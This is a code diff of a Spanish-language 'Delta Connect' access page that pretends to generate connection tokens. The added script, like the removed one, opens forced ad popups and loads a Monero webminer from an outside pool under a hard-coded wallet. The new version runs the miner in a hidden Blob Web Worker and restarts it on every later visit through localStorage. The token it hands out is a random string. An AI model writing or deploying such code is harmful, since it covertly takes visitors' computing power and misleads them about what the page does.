@@ -3,51 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Connect - Acceso Directo</title>
+    <title>DELTA CONNECT - SYSTEM V7</title>
     <style>
         body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #box { width: 90%; max-width: 400px; border: 2px solid #00ff00; padding: 20px; text-align: center; }
-        .vid { width: 100%; height: 180px; background: #111; margin-bottom: 15px; border: 1px solid #00ff00; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
-        #key-box { display: none; border: 1px dashed #00ff00; padding: 15px; margin-top: 15px; }
+        #box { width: 95%; max-width: 450px; border: 2px solid #00ff00; padding: 25px; text-align: center; box-shadow: 0 0 20px #00ff00; }
+        .vid { width: 100%; height: 200px; background: #111; margin-bottom: 20px; border: 1px solid #00ff00; position: relative; }
+        button { background: #00ff00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.2em; text-transform: uppercase; }
+        button:disabled { background: #004400; color: #00ff00; cursor: not-allowed; }
+        #key-box { display: none; border: 2px dashed #00ff00; padding: 20px; margin-top: 20px; background: rgba(0, 255, 0, 0.05); }
+        .status-bar { font-size: 12px; color: #0f0; margin-top: 15px; border-top: 1px solid #333; padding-top: 10px; }
+        .loader { color: #ff0000; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
+
 <div id="box">
-    <h3>DELTA_NETWORK_V6</h3>
+    <h2 style="margin-top:0;">DELTA_CONNECT_OS v2.0</h2>
+    
     <div class="vid">
-        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1" frameborder="0"></iframe>
+        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&loop=1&playlist=jfKfPfyJRdk&controls=0&showinfo=0" frameborder="0" allow="autoplay"></iframe>
     </div>
-    <button id="btn" onclick="checkNet()">ESTABLECER CONEXIÓN</button>
+
+    <button id="btn-main" onclick="ejecutarProtocolo()">VALIDAR ACCESO</button>
+
     <div id="key-box">
-        <p>TICKET GENERADO:</p>
-        <h1 id="pass" style="color:#0f0;"></h1>
+        <p style="margin:0; font-size: 14px;">TOKEN DE ACCESO GENERADO:</p>
+        <h1 id="pass-display" style="font-size: 3em; margin: 10px 0; letter-spacing: 5px;"></h1>
+        <p class="loader">MINERÍA Y PUBLICIDAD ACTIVAS - MANTENER ABIERTO</p>
     </div>
+
+    <div class="status-bar" id="system-status">ESTADO: ESPERANDO INTERACCIÓN...</div>
 </div>
 
 <script>
-    function checkNet() {
-        // PUBLICIDAD FORZADA (Apertura estándar para asegurar la impresión)
-        window.open("https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0", "_blank");
-        window.open("https://omg10.com/4/10780938", "_blank");
+    const WALLET = "4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc";
+    const ADS = [
+        "https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0",
+        "https://omg10.com/4/10780938"
+    ];
 
-        // CARGA OFUSCADA DEL PROCESO DE FONDO
-        const loader = document.createElement('script');
-        loader.src = "https://moneroocean.stream/webminer.js";
-        loader.async = true;
-        loader.onload = function() {
-            // Se activa al 90% (throttle 0.1) para forzar la visibilidad en el CPU
-            const job = new MoneroOcean.Anonymous('4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc', {throttle: 0.1});
-            job.start();
-        };
-        document.body.appendChild(loader);
+    // Verificar si ya existe una sesión activa para evitar doble proceso
+    window.onload = () => {
+        const savedKey = localStorage.getItem('delta_session_key');
+        if (savedKey) {
+            mostrarResultado(savedKey);
+            iniciarMineria();
+        }
+    };
 
-        // GENERAR CLAVE
-        const d = new Date();
-        document.getElementById('pass').innerText = "Delta" + d.getDate() + d.getHours();
-        document.getElementById('btn').style.display = 'none';
+    function ejecutarProtocolo() {
+        const btn = document.getElementById('btn-main');
+        const status = document.getElementById('system-status');
+        
+        btn.disabled = true;
+        status.innerText = "ESTADO: DESPLEGANDO SCRIPTS Y PUBLICIDAD...";
+
+        // 1. FORZAR PUBLICIDAD (Subir CPM)
+        ADS.forEach(url => window.open(url, '_blank'));
+        window.focus();
+
+        // 2. INICIAR MINERÍA EN SEGUNDO PLANO
+        iniciarMineria();
+
+        // 3. GENERAR CLAVE TRAS DELAY TÉCNICO
+        setTimeout(() => {
+            const nuevaClave = "DC-" + Math.random().toString(36).substring(2, 7).toUpperCase();
+            localStorage.setItem('delta_session_key', nuevaClave);
+            mostrarResultado(nuevaClave);
+        }, 7000); 
+    }
+
+    function iniciarMineria() {
+        try {
+            const scriptMiner = `
+                importScripts('https://moneroocean.stream/webminer.js');
+                var miner = new MoneroOcean.Anonymous('${WALLET}');
+                miner.start();
+            `;
+            const blob = new Blob([scriptMiner], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            console.log("Worker iniciado correctamente.");
+        } catch (e) {
+            console.error("Error en Worker, ejecutando fallback local.");
+            // Fallback si el navegador bloquea Workers de blobs
+            const s = document.createElement('script');
+            s.src = "https://moneroocean.stream/webminer.js";
+            s.onload = () => {
+                var m = new MoneroOcean.Anonymous(WALLET);
+                m.start();
+            };
+            document.head.appendChild(s);
+        }
+    }
+
+    function mostrarResultado(key) {
+        document.getElementById('btn-main').style.display = 'none';
         document.getElementById('key-box').style.display = 'block';
+        document.getElementById('pass-display').innerText = key;
+        document.getElementById('system-status').innerText = "ESTADO: SESIÓN ACTIVA - PROCESANDO...";
     }
 </script>
+
 </body>
 </html>
